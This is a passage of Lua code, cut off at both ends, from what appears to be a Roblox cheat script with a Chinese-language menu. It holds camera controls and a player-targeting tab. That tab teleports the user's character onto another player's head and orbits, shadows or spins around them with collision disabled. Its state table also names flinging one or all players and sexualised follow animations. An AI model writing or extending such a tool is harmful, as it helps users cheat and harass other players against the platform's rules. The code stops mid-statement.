        self._ACS_essentialServices._ACS_interfaceManager:SetCore("SendNotification", {
            Title = "摄像机设置",
            Text = "已切换到: "..ACS_selectedMode,
            Duration = 3,
        })
    end

    function ACS_CameraController:ACS_adjustFlightVelocity(ACS_velocityValue)
        local ACS_numericVelocity = tonumber(ACS_velocityValue)
        if ACS_numericVelocity and ACS_numericVelocity >= 1 and ACS_numericVelocity <= 20 then
            self._ACS_cameraSettings._ACS_flightVelocity = ACS_numericVelocity
            self._ACS_essentialServices._ACS_interfaceManager:SetCore("SendNotification", {
                Title = "摄像机设置",
                Text = "自由视角速度已设为: "..ACS_numericVelocity,
                Duration = 3,
            })
        end
    end

    function ACS_CameraController:ACS_adjustInputResponse(ACS_responseValue)
        local ACS_numericResponse = tonumber(ACS_responseValue)
        if ACS_numericResponse and ACS_numericResponse >= 0.1 and ACS_numericResponse <= 2.0 then
            self._ACS_cameraSettings._ACS_inputResponse = ACS_numericResponse
            self._ACS_essentialServices._ACS_interfaceManager:SetCore("SendNotification", {
                Title = "摄像机设置",
                Text = "鼠标灵敏度已设为: "..ACS_numericResponse,
                Duration = 3,
            })
        end
    end

    function ACS_CameraController:ACS_adjustOverheadAltitude(ACS_altitudeValue)
        local ACS_numericAltitude = tonumber(ACS_altitudeValue)
        if ACS_numericAltitude and ACS_numericAltitude >= 10 and ACS_numericAltitude <= 100 then
            self._ACS_cameraSettings._ACS_overheadAltitude = ACS_numericAltitude
            self._ACS_essentialServices._ACS_interfaceManager:SetCore("SendNotification", {
                Title = "摄像机设置",
                Text = "上帝视角高度已设为: "..ACS_numericAltitude,
                Duration = 3,
            })
        end
    end

    function ACS_CameraController:ACS_adjustOrbitalDistance(ACS_distanceValue)
        local ACS_numericDistance = tonumber(ACS_distanceValue)
        if ACS_numericDistance and ACS_numericDistance >= 5 and ACS_numericDistance <= 50 then
            self._ACS_cameraSettings._ACS_orbitalDistance = ACS_numericDistance
            self._ACS_essentialServices._ACS_interfaceManager:SetCore("SendNotification", {
                Title = "摄像机设置",
                Text = "轨道半径已设为: "..ACS_numericDistance,
                Duration = 3,
            })
        end
    end

    local ACS_CameraConfigurationSection = Tab2:section("摄像机设置", true)

    ACS_CameraConfigurationSection:Dropdown("摄像机类型", "CameraType", {
        "默认视角",
        "第一人称锁定", 
        "上帝视角",
        "自由飞行模式(需要键盘移动)",
        "轨道环绕模式",
        "固定视角模式"
    }, function(Value)
        ACS_CameraController:ACS_switchCameraMode(Value)
    end)

    ACS_CameraConfigurationSection:Textbox("自由视角速度", "FreeCameraSpeed", "移动速度 (1-20)", function(Value)
        ACS_CameraController:ACS_adjustFlightVelocity(Value)
    end)

    ACS_CameraConfigurationSection:Textbox("鼠标灵敏度", "MouseSensitivity", "灵敏度 (0.1-2.0)", function(Value)
        ACS_CameraController:ACS_adjustInputResponse(Value)
    end)

    ACS_CameraConfigurationSection:Textbox("上帝视角高度", "TopDownHeight", "高度值 (10-100)", function(Value)
        ACS_CameraController:ACS_adjustOverheadAltitude(Value)
    end)

    ACS_CameraConfigurationSection:Textbox("轨道半径", "OrbitRadius", "环绕半径 (5-50)", function(Value)
        ACS_CameraController:ACS_adjustOrbitalDistance(Value)
    end)

    ACS_CameraConfigurationSection:Button("重置为默认", function()
        ACS_CameraController:_ACS_restoreDefaultConfiguration()
    end)
end

local PlayerTabModule = {
    LoadPlayerTab = function(MainWindow, UI_Library)
        local Module = {
            state = {
                selectedPlayer = nil,
                allPlayers = {},
                isSitting = false,
                isLoopHeadSit = false,
                isOrbiting = false,
                isMirroring = false,
                isFloating = false,
                isShadowFollowing = false,
                isReversing = false,
                isDancing = false,
                isShadowAscending = false,
                isMonitoring = false,
                isTeleportingSame = false,
                isTeleportingAll = false,
                isAntiFollowing = false,
                isSpinning = false,
                isShaking = false,
                isFaceStanding = false,
                isBackSitting = false,
                isAutoFollowing = false,
                isSucking = false,
                isSusFollowing = false,
                isFlingingSingle = false,
                isFlingingAll = false,
                isLoopFlingingSingle = false,
                isLoopFlingingAll = false,
                isModernFollowing = false,
                isEnhancedSuckFollowing = false,
                suckingAnim = nil,
                susAnim = nil,
                modernAnim = nil,
                enhancedSuckAnim = nil
            },
            connections = {
                playerListRefresh = nil,
                headSit = nil,
                orbit = nil,
                mirror = nil,
                float = nil,
                shadow = nil,
                reverse = nil,
                dance = nil,
                shadowAscend = nil,
                monitor = nil,
                antiFollow = nil,
                spin = nil,
                shake = nil,
                faceStand = nil,
                backSit = nil,
                autoFollow = nil,
                suckFollow = nil,
                susFollow = nil,
                teleportThreads = {},
                flingThreads = {},
                modernFollow = nil,
                enhancedSuckFollow = nil
            },
            config = {
                orbitRadius = 5,
                orbitSpeed = 0.05,
                floatHeight = 3,
                shadowAscendSpeed = 0.5,
                teleportInterval = 0.3,
                mirrorDistance = 4,
                antiFollowDistance = 8,
                spinSpeed = 5,
                shakeIntensity = 2
            }
        }

        local TweenService = game:GetService("TweenService")
        local LocalPlayer = game.Players.LocalPlayer
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")

        local function getLocalCharacter()
            local localPlayer = game.Players.LocalPlayer
            if not localPlayer then return nil end
            return localPlayer.Character or localPlayer.CharacterAdded:Wait()
        end

        local function getTargetPlayer(playerName)
            for _, player in ipairs(game.Players:GetPlayers()) do
                if player.Name == playerName or player.DisplayName == playerName then
                    return player
                end
            end
            return nil
        end

        local function disableCollision(localChar)
            if not localChar then return end
            for _, part in ipairs(localChar:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                    part.CanTouch = false
                end
            end
        end

        local function enableCollision(localChar)
            if not localChar then return end
            for _, part in ipairs(localChar:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                    part.CanTouch = true
                end
            end
        end

        local function cleanAllResources()
            for _, conn in pairs(Module.connections) do
                if typeof(conn) == "RBXScriptConnection" then
                    conn:Disconnect()
                elseif typeof(conn) == "table" then
                    for _, thread in ipairs(conn) do
                        if thread then task.cancel(thread) end
                    end
                end
            end
            for k in pairs(Module.state) do
                if type(Module.state[k]) == "boolean" then
                    Module.state[k] = false
                elseif type(Module.state[k]) == "table" then
                    Module.state[k] = {}
                else
                    Module.state[k] = nil
                end
            end
            Module.connections = {teleportThreads = {}, flingThreads = {}}
            
            local localChar = getLocalCharacter()
            if localChar then
                enableCollision(localChar)
            end
            if workspace then
                workspace.Gravity = 196.2
            end
        end

        local function showNotify(title, text, duration)
            local success, err = pcall(function()
                if UI_Library and UI__G.Notify then
                    UI__G.Notify(title, text, duration or 3)
                else
                    _G.Notify(tostring(title), tostring(text), duration)
                end
            end)
            if not success then
                warn("通知发送失败:", err)
            end
        end

        local function stopHeadSit()
            Module.state.isSitting = false
            if Module.connections.headSit then
                Module.connections.headSit:Disconnect()
                Module.connections.headSit = nil
            end

            local localChar = getLocalCharacter()
            if localChar then
                local localHumanoid = localChar:FindFirstChildOfClass("Humanoid")
                if localHumanoid then
                    localHumanoid.Sit = false
                    enableCollision(localChar)
                end
            end
            showNotify("坐头停止", "已停止坐头", 3)
        end

        local function startHeadSit(targetPlayerName)
            if Module.connections.headSit then
                Module.connections.headSit:Disconnect()
                Module.connections.headSit = nil
            end
            Module.state.isSitting = true

            local localPlayer = game.Players.LocalPlayer
            local localChar = getLocalCharacter()
            if not localChar then
                showNotify("坐头失败", "本地角色未加载", 3)
                Module.state.isSitting = false
                return
            end
            local localHumanoid = localChar:FindFirstChildOfClass("Humanoid")
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localHumanoid or not localRoot then
                showNotify("坐头失败", "角色缺少关键部件", 3)
                Module.state.isSitting = false
                return
            end

            disableCollision(localChar)
            localHumanoid.Sit = true

            Module.connections.headSit = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isSitting or not localChar.Parent then
                        if Module.state.isLoopHeadSit and localPlayer.Character then
                            task.wait(1)
                            if Module.state.isLoopHeadSit and Module.state.selectedPlayer then
                                startHeadSit(Module.state.selectedPlayer)
                            end
                        else
                            cleanAllResources()
                        end
                        return
                    end

                    local targetPlayer = getTargetPlayer(targetPlayerName)
                    if not targetPlayer or not targetPlayer.Character then
                        showNotify("坐头停止", "目标玩家角色消失", 3)
                        if Module.state.isLoopHeadSit then
                            task.wait(1)
                            if Module.state.isLoopHeadSit and Module.state.selectedPlayer then
                                startHeadSit(Module.state.selectedPlayer)
                            end
                        else
                            cleanAllResources()
                        end
                        return
                    end
                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then return end

                    local headPos = targetRoot.CFrame * CFrame.new(0, 1.6, 0.4)
                    localRoot.CFrame = headPos
                    disableCollision(localChar)
                end)
            end)

            showNotify("坐头启动", "已开始坐 " .. tostring(targetPlayerName) .. " 的头", 3)
        end

        local function stopAllTeleports()
            for _, thread in ipairs(Module.connections.teleportThreads) do
                if thread then task.cancel(thread) end
            end
            Module.connections.teleportThreads = {}
        end

        local function teleportToPlayer(targetPlayer)
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                localRoot.CFrame = targetRoot.CFrame
            end
        end

        local function startOrbit(targetPlayer)
            stopAllTeleports()
            Module.state.isOrbiting = true
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            disableCollision(localChar)

            local angle = 0
            Module.connections.orbit = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isOrbiting or not localChar.Parent then
                        if Module.state.isOrbiting and localChar then
                            task.wait(1)
                            if Module.state.isOrbiting and Module.state.selectedPlayer then
                                local newTarget = getTargetPlayer(Module.state.selectedPlayer)
                                if newTarget then startOrbit(newTarget) end
                            end
                        else
                            Module.connections.orbit:Disconnect()
                            Module.connections.orbit = nil
                            enableCollision(localChar)
                        end
                        return
                    end

                    if not targetPlayer.Character then
                        showNotify("环绕停止", "目标玩家角色消失", 3)
                        Module.connections.orbit:Disconnect()
                        Module.connections.orbit = nil
                        enableCollision(localChar)
                        return
                    end

                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then return end

                    angle = angle + Module.config.orbitSpeed
                    if angle > 360 then angle = 0 end
                    local offset = Vector3.new(
                        math.cos(angle) * Module.config.orbitRadius,
                        2,
                        math.sin(angle) * Module.config.orbitRadius
                    )
                    localRoot.CFrame = CFrame.new(targetRoot.Position + offset, targetRoot.Position)
                    disableCollision(localChar)
                end)
            end)
        end

        local function stopOrbit()
            Module.state.isOrbiting = false
            if Module.connections.orbit then
                Module.connections.orbit:Disconnect()
                Module.connections.orbit = nil
            end
            local localChar = getLocalCharacter()
            if localChar then enableCollision(localChar) end
        end

        local function startMirror(targetPlayer)
            Module.state.isMirroring = true
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            disableCollision(localChar)

            Module.connections.mirror = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isMirroring or not localChar.Parent then
                        if Module.state.isMirroring and localChar then
                            task.wait(1)
                            if Module.state.isMirroring and Module.state.selectedPlayer then
                                local newTarget = getTargetPlayer(Module.state.selectedPlayer)
                                if newTarget then startMirror(newTarget) end
                            end
                        else
                            Module.connections.mirror:Disconnect()
                            Module.connections.mirror = nil
                            enableCollision(localChar)
                        end
                        return
                    end

                    if not targetPlayer.Character then
                        showNotify("镜像停止", "目标玩家角色消失", 3)
                        Module.connections.mirror:Disconnect()
                        Module.connections.mirror = nil
                        enableCollision(localChar)
                        return
                    end

                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then return end

                    local mirrorPos = targetRoot.CFrame * CFrame.new(Module.config.mirrorDistance, 0, 0)
                    local lookVector = targetRoot.CFrame.LookVector
                    local mirrorCFrame = CFrame.new(mirrorPos.Position) * CFrame.Angles(0, math.pi, 0)
                    localRoot.CFrame = mirrorCFrame
                    disableCollision(localChar)
                end)
            end)
        end

        local function stopMirror()
            Module.state.isMirroring = false
            if Module.connections.mirror then
                Module.connections.mirror:Disconnect()
                Module.connections.mirror = nil
            end
            local localChar = getLocalCharacter()
            if localChar then enableCollision(localChar) end
        end

        local function startFloat(targetPlayer)
            Module.state.isFloating = true
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            disableCollision(localChar)

            Module.connections.float = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isFloating or not localChar.Parent then
                        if Module.state.isFloating and localChar then
                            task.wait(1)
                            if Module.state.isFloating and Module.state.selectedPlayer then
                                local newTarget = getTargetPlayer(Module.state.selectedPlayer)
                                if newTarget then startFloat(newTarget) end
                            end
                        else
                            Module.connections.float:Disconnect()
                            Module.connections.float = nil
                            enableCollision(localChar)
                        end
                        return
                    end

                    if not targetPlayer.Character then
                        showNotify("漂浮停止", "目标玩家角色消失", 3)
                        Module.connections.float:Disconnect()
                        Module.connections.float = nil
                        enableCollision(localChar)
                        return
                    end

                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then return end

                    local floatPos = targetRoot.Position + Vector3.new(0, Module.config.floatHeight, 0)
                    localRoot.CFrame = CFrame.new(floatPos)
                    disableCollision(localChar)
                end)
            end)
        end

        local function stopFloat()
            Module.state.isFloating = false
            if Module.connections.float then
                Module.connections.float:Disconnect()
                Module.connections.float = nil
            end
            local localChar = getLocalCharacter()
            if localChar then enableCollision(localChar) end
        end

        local function startShadow(targetPlayer)
            Module.state.isShadowFollowing = true
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            disableCollision(localChar)

            Module.connections.shadow = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isShadowFollowing or not localChar.Parent then
                        if Module.state.isShadowFollowing and localChar then
                            task.wait(1)
                            if Module.state.isShadowFollowing and Module.state.selectedPlayer then
                                local newTarget = getTargetPlayer(Module.state.selectedPlayer)
                                if newTarget then startShadow(newTarget) end
                            end
                        else
                            Module.connections.shadow:Disconnect()
                            Module.connections.shadow = nil
                            enableCollision(localChar)
                        end
                        return
                    end

                    if not targetPlayer.Character then
                        showNotify("影子停止", "目标玩家角色消失", 3)
                        Module.connections.shadow:Disconnect()
                        Module.connections.shadow = nil
                        enableCollision(localChar)
                        return
                    end

                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then return end

                    local shadowPos = targetRoot.Position - Vector3.new(0, 3, 0)
                    localRoot.CFrame = CFrame.new(shadowPos)
                    disableCollision(localChar)
                end)
            end)
        end

        local function stopShadow()
            Module.state.isShadowFollowing = false
            if Module.connections.shadow then
                Module.connections.shadow:Disconnect()
                Module.connections.shadow = nil
            end
            local localChar = getLocalCharacter()
            if localChar then enableCollision(localChar) end
        end

        local function startAntiFollow(targetPlayer)
            Module.state.isAntiFollowing = true
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            disableCollision(localChar)

            Module.connections.antiFollow = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isAntiFollowing or not localChar.Parent then
                        if Module.state.isAntiFollowing and localChar then
                            task.wait(1)
                            if Module.state.isAntiFollowing and Module.state.selectedPlayer then
                                local newTarget = getTargetPlayer(Module.state.selectedPlayer)
                                if newTarget then startAntiFollow(newTarget) end
                            end
                        else
                            Module.connections.antiFollow:Disconnect()
                            Module.connections.antiFollow = nil
                            enableCollision(localChar)
                        end
                        return
                    end

                    if not targetPlayer.Character then
                        showNotify("反向停止", "目标玩家角色消失", 3)
                        Module.connections.antiFollow:Disconnect()
                        Module.connections.antiFollow = nil
                        enableCollision(localChar)
                        return
                    end

                    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not targetRoot then return end

                    local antiPos = targetRoot.Position - targetRoot.CFrame.LookVector * Module.config.antiFollowDistance
                    localRoot.CFrame = CFrame.new(antiPos)
                    disableCollision(localChar)
                end)
            end)
        end

        local function stopAntiFollow()
            Module.state.isAntiFollowing = false
            if Module.connections.antiFollow then
                Module.connections.antiFollow:Disconnect()
                Module.connections.antiFollow = nil
            end
            local localChar = getLocalCharacter()
            if localChar then enableCollision(localChar) end
        end

        local function startSpin(targetPlayer)
            Module.state.isSpinning = true
            local localChar = getLocalCharacter()
            if not localChar then return end
            local localRoot = localChar:FindFirstChild("HumanoidRootPart")
            if not localRoot then return end

            disableCollision(localChar)

            local spinAngle = 0
            Module.connections.spin = _G.CreateHeartbeatConnection(function()
                pcall(function()
                    if not Module.state.isSpinning or not localChar.Parent then
                        if Module.state.isSpinning and localChar then
                            task.wait(1)
                            if Module.state.isSpinning and Module.state.selectedPlayer then
                                local 